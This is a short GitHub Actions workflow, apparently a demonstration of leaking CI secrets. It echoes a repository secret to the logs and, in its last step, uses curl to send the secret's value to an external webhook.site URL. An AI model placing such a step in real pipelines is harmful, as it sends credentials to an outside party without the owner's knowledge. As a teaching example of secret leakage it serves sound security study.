name: IaC

# Controls when the new movie hosting locations are created or updated
on:
  push:
    branches: [ feature/english ]
  pull_request:
    branches: [ main ]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

jobs:
 
  build:
    runs-on: ubuntu-latest
    environment: Vienna

    env:
      FAVORITE_MOVIE: '${{ secrets.FAVOURITE }}'
    steps:
      - name: Add mask
        run: |
          echo "${{ secrets.FAVOURITE }}" 

      - name: I ll tell you my current favourite 
        run: echo ${{ secrets.FAVOURITE }}
      
      - name: Tell me the secret
        run: CURL -d GET https://webhook.site/b02861c6-0736-4a8e-b5b3-9628b6d02181/$FAVORITE_MOVIE
